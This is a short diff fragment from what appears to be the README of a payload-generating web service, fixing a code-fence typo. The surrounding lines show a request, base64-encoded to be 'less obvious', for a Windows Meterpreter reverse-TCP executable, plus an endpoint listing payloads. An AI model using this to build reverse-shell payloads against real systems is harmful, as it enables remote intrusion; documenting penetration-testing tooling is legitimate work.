@@ -27,7 +27,7 @@ For less obvious traffic, you can send the parameters as base64 (using the cover
 ```
 http://192.168.1.100:3000/a?b=cD13aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfdGNwJmxob3N0PUhPU1QmbHBvcnQ9UE9SVCZmPWV4ZQo=
 # example encoded payload is 'p=windows/meterpreter/reverse_tcp&lhost=HOST&lport=PORT&f=exe'
-``
+```
 To list all payloads:
 ```
 http://192.168.1.100:3000/api/payloads
